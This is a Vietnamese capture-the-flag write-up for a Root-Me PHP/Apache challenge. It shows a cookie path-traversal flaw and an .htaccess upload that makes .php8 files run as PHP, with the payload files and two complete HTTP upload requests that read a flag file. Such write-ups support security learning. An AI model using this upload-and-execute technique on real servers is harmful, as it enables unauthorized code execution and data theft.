# PHP - Apache configuration

## Solution

- Quan sát

    - Phân tích request - response cho chức năng tải lên và quan sát rằng có thể tải lên php8.

    - Ngoài ra, hãy quan sát rằng `Cookie: PHPSESSID-APACHE2RCE=` cookie dẫn đến lỗ hổng path traversal (có thể thay đổi thư mục "create" nơi muốn tải file lên).

    - Ngoài ra, hãy quan sát rằng có thể tải lên tệp .htaccess và ghi lại quyền thực thi cho php.

- Chuẩn bị payload

    - Chuẩn bị file .htaccess:

    ```
    AddType application/x-httpd-php .php8
    ```

    - Chuẩn bị malicious file (trong trường hợp này là xxx.php8):

    ```
    <?php
    $flag = '/var/www/html/private/flag.txt';
    echo file_get_contents($flag);
    ?>
    ```

- Tấn công:

    Tải lên 2 tệp bằng giá trị cookie đã sửa đổi (`PHPSESSID-APACHE2RCE=a/../../`):

    -> Tải lên .htaccess vào thư mục /uploads

    ```
    POST /index.php HTTP/1.1
    Host: challenge01.root-me.org:59062
    Content-Length: 230
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: http://challenge01.root-me.org:59062
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUBfb8CcZzcx6QNff
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://challenge01.root-me.org:59062/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

    Cookie: {{PHPSESSID-APACHE2RCE=a/../../}}

    Connection: close

    ------WebKitFormBoundaryUBfb8CcZzcx6QNff
    Content-Disposition: form-data; name="uploaded_file"; filename=".htaccess"
    Content-Type: text/php

    AddType application/x-httpd-php .php8


    ------WebKitFormBoundaryUBfb8CcZzcx6QNff--
    ```

    Tải lên file độc hại để đọc flag:

    ```
    POST /index.php HTTP/1.1
    Host: challenge01.root-me.org:59062
    Content-Length: 282
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: http://challenge01.root-me.org:59062
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUBfb8CcZzcx6QNff
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://challenge01.root-me.org:59062/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
    Cookie: PHPSESSID-APACHE2RCE=a/../../
    Connection: close

    ------WebKitFormBoundaryUBfb8CcZzcx6QNff
    Content-Disposition: form-data; name="uploaded_file"; filename="flag.php8"
    Content-Type: text/php

    <?php

    $flag = '/var/www/html/private/flag.txt';
    echo file_get_contents($flag);


    ?>

    ------WebKitFormBoundaryUBfb8CcZzcx6QNff--
    ```

    Lấy flag: Điều hướng đến uploads//flag.php8